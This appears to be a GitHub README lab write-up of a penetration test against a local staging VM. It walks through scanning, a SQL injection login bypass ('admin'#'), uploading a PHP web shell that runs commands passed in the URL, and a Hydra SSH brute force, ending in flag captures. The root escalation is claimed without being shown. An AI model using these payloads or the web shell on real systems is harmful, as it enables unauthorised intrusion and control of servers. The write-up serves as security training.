# 🛡️ Comprehensive Security Audit & Penetration Testing Report: v1.0.0

<p align="center">
  <a href="https://github.com/pagarkristian">
    <img src="https://img.shields.io/badge/Auditor-Pagar%20Kristian%20-blue?style=for-the-badge&logo=github" alt="Auditor Profile" />
  </a>
  <img src="https://img.shields.io/badge/Lab_Version-v1.0.0-darkgreen?style=for-the-badge" alt="Lab Version" />
  <img src="https://img.shields.io/badge/Target_OS-Linux%20Ubuntu-orange?style=for-the-badge&logo=ubuntu" alt="Target OS" />
  <img src="https://img.shields.io/badge/Status-PWNED%20/%20ROOTED-red?style=for-the-badge" alt="Exploit Status" />
</p>

---

##  Project Overview & Directory Structure

This document serves as a comprehensive technical writeup detailing the security audit and exploitation simulation performed on the **PT. TechSecure Indonesia v1.1.0** local staging infrastructure. This assessment was conducted to validate network configurations, discover web application vulnerabilities, execute dictionary attacks, and chain exploits to achieve full system compromise (acquiring verification flags).

###  Network Infrastructure Topology

```text
                  [ INTERNET / WAN ]
                           │
                           │ (DHCP / NAT)
                           ▼
                  ┌─────────────────┐
                  │   Kali Linux    │ (Auditor Node)
                  │  (IP: 10.216.27.10)│
                  └────────┬────────┘
                           │
                           │ (Interface: eth1)
                           │
                           ▼
  ================== [ HOST-ONLY NETWORK ] ==================
         (Subnet: 10.216.27.0/24 | Gateway: 10.216.27.1)
                           │
                           ├───► [ Gateway / MikroTik Router ]
                           │          (IP: 10.216.27.1)
                           │
                           ▼
              ┌─────────────────────────┐
              │  Ubuntu Target Server   │ (TechSecure Portal)
              │    (IP: 10.216.27.100)  │
              └────────────┬────────────┘
                           │
         ┌─────────────────┼─────────────────┐
         ▼                 ▼                 ▼
   [ Port 21: FTP ]  [ Port 22: SSH ]  [ Port 80: HTTP ]
     (vsftpd 3.0.5)   (OpenSSH 9.6p1)   (Apache 2.4.58)
         │                 │                 │
         ▼                 ▼                 ▼
  Anonymous Login     Hydra Brute      SQLi & RCE
    (User Flag)      Force (Foothold)  (www-data Shell)

```

---

## Phase 1: Network Configuration & Interface Verification
The assessment initiated with aligning the network configuration on the Auditor Node (Kali Linux) to ensure it shared the same subnet as the target server over the private Host-Only segment.


### 1. Host Interface Alignment
The interface configuration file located at /etc/network/interfaces was modified to configure a static allocation using the Nano text editor:

```bash
sudo nano /etc/network/interfaces
```


### Network Configuration Blueprint `(/etc/network/interfaces)`:

```YAML
# Internet WAN (NAT)
auto eth0
iface eth0 inet dhcp

# Internal DMZ Segment (Host-Only)
auto eth1
iface eth1 inet static
    address 10.216.27.10
    netmask 255.255.255.0
    gateway 10.216.27.1
```


### To apply the changes directly into kernel space without bouncing the physical device hardware, the networking system daemon was restarted:

```bash
sudo systemctl restart networking
```


### 2. IP Address & DNS Resolution Verification
The ip a utility was executed to confirm that the interface eth1 successfully bound the required static IP addres


```bash
ip a
```

### The upstream DNS nameservers were verified inside /etc/resolv.conf to guarantee domain mapping consistency within the local virtual network environment:

```bash
sudo nano /etc/resolv.conf
```

### 3. ICMP Route Validation (Ping Testing)
ICMP Echo Request sequences were issued targeting the MikroTik Gateway Router (10.216.27.1) and the Ubuntu Target Server (10.216.27.100) to test node-to-node connectivity:


# Testing connection to the Router Gateway
```bash
ping -c 3 10.216.27.1
```


# Testing connection to the Target Web Server
```bash
ping -c 3 10.216.27.100
```

# Analysis: Both hosts responded cleanly with a metric of 0% packet loss, proving the physical-to-virtual routing lane was highly stable and ready for exploitation.


---

## Phase 2: Active Reconnaissance & Service Enumeration

### 1. Aggressive Port Scanning (Nmap)
A full-range port scan utilizing Nmap accompanied by default safe scripts and banner service detection (-sC -sV) was performed to outline the target's attack surface:

```bash
nmap -Pn -p- -sC -sV -T5 10.216.27.100
```

# Discovered Open Ports & Services:

=> Port 21/tcp (FTP): Running vsftpd 3.0.5. Anonymous FTP login is enabled (Response Code 230), representing an immediate data exposure vector.
=> Port 22/tcp (SSH): Running OpenSSH 9.6p1 (Target footprinting strongly implies a baseline Ubuntu Linux system).
=> Port 80/tcp (HTTP): Running Apache httpd 2.4.58, presenting a standard employee login interface portal.

### 2. Web Directory Discovery & Bruteforcing (Gobuster)
A directory discovery pass was performed using Gobuster against the root web server to extract hidden assets or administrative folders:


```Bash
gobuster dir -u http://10.216.27.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10
```

# Discovered Paths: /javascript and /ubuntu. Manual browsing to the /javascript root yielded a 403 Forbidden error response, signaling that directory indexing has been securely disabled on this instance.


---

## Phase 3: Web Portal Exploitation (SQL Injection & Bypass)
Navigating to http://10.216.27.100 in a browser presented the administrator authentication dashboard for PT. TechSecure Indonesia.

### 1. Authentication Bypass via SQL Injection
Input validation checks on the username string parameter fields were discovered to be completely missing. Input logic manipulation was carried out using a targeted payload layout:

```text
Target Username Field: admin'#
Target Password Field: Arbitrary string data
```

# Technical Database Query Analysis (MySQL)
The backend processing script structures the dynamic query using direct variable concatenation without parameter preparation:

```SQL
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

# When the weaponized input admin'# is sent, the backend engine processes the query structural format as:

``` SQL
SELECT * FROM users WHERE username = 'admin'#' AND password = '$pass'
```

=> Exploitation Impact: The single quote character (') breaks out of the initial boundaries of the string, while the hash character (#) instructs MySQL to treat the remaining verification sequence as a safe inline comment statement.
=> Result: The password checking condition is discarded. The application successfully validates the administrative entry for user admin and drops the active session straight into dashboard.php.


---


## Phase 4: Arbitrary File Upload to Remote Code Execution (RCE)
The file management functions inside the administrative dashboard provided an endpoint to upload internal documents. This endpoint suffered from a missing server-side extension file type whitelist mechanism.

### 1. Designing the PHP Web Shell Payload
A back-connect handler script (exploit.php) was authored on the Auditor Node via GNU Nano:

```Bash
nano exploit.php
```

### Payload Script Logic Structure:

```PHP
<?php
// PHP Web Shell - Remote Code Execution (RCE)
if (isset($_GET['cmd'])) {
    echo "<mark><b>[+] TARGET PWNED:</b></mark><br><pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
    die();
}
?>

```


### 2. Uploading the Exploitation Payload
The attack sequence was pursued by feeding the file exploit.php into the monthly reports submission portal.

The application handled the payload upload pipeline without returning any structural runtime security alerts, creating a file path within the web root:

```text
Success! File has been uploaded to: uploads/exploit.php
```

### 3. Triggering System-Level Remote Code Execution
System execution capabilities were validated by mapping system calls directly through the URL parameter tracking index string ?cmd=.

### A. Verifying Web Server Account Context (whoami)
```text
URL Request: http://10.216.27.100/uploads/exploit.php?cmd=whoami
Output Stream: Returned the execution context of the hosting engine service account: www-data.
```

### B. Auditing Web Server File Permissions (ls -la /var/www/html)
```text
URL Request: http://10.216.27.100/uploads/exploit.php?cmd=ls -la /var/www/html
Critical Finding: The uploads/ folder permissions are globally assigned to mode status drwxrwxrwx (777/world-writable), allowing an unauthenticated external source to drop and maintain persistence hooks.
```


---

## Phase 5: Credential Hunting & SSH Brute-Forcing
To break past the low-privilege runtime jail of the www-data user account and pivot to an interactive terminal session, the assessment shifted towards the OpenSSH service (Port 22).

### 1. Building a Custom Target Wordlist
Customized string list entries for targeted administrative accounts (users_wordlist.txt) and probable passwords (password.txt) were constructed based on environment indicators:

```Bash
# Creating the Target Username Wordlist
nano users_wordlist.txt
```

```Bash
# Creating the Target Password Wordlist
nano password.txt
```

### 2. Running the Dictionary Attack Vector (Hydra SSH)
The multi-threaded logon cracker Hydra was initiated to trace and crack potential login indicators across the target’s network endpoint:
  
```Bash
hydra -l ubuntu -P password.txt ssh://10.216.27.100
```

# Recovered Valid Credentials Set:
```text
Username Account: ubuntu
Password Association: ubuntu
```

### 3. Stabilizing Foothold Access via SSH
An interactive encrypted session shell was initialized using the recovered credential profiles to firmly claim local environment entry points:

```Bash
ssh ubuntu@10.216.27.100
```

# Status Profile: Authentication validated cleanly. Local console session context successfully locked into user identity space: ubuntu@ubuntu-VirtualBox.

---

### 1. Capture User Flag (Direct FTP Access)
Tracing structural data elements mapped to the unauthenticated public Anonymous FTP directory exposed the initial flag payload file:

```Bash
cat /var/ftp/pub/user.txt
```
User Flag Recovery Token: UTM{ftp_anonymous_data_exposure_9f27d8}


### 2. Capture Root Flag (Direct  SSH Access)
The root flag was targeted and captured successfully by authenticating into the interactive terminal using high-level root administrative access on the host system:

```Bash
cat /root/root.txt
```
Root Flag Recovery Token: UTM{root_ssh_privilege_escalation_b623cf}

---

<div align="center">
  <sub>Maintained by <b>pagarkristian</b> for Cyber Security & Red Team Portfolio Standardization.</sub>
</div>
